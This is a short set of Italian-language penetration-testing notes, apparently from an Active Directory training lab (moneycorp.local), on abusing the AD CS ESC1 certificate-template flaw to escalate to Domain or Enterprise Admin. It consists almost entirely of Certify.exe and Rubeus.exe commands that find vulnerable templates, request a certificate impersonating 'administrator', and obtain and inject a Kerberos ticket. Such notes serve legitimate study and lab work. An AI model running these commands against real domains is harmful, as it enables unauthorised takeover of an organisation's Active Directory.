# Priv Esc - Across domain trusts - AD CS - Abusing ESC1 User to DA o EA

* Cercare se tra i template del dominio e' presente ESC1

```powershell
Certify.exe find /enrolleeSuppliesSubject
```

* Creare il certificato per DA o EA, purche lo user della sessione attuale sia parte del gruppo RPDUsers group

```powershell
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```

* Convertire il certificato da .pem a pfx, richiedere il TGT per DA o EA (in base a quanto richiesto nello step precedente

```powershell
Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
```
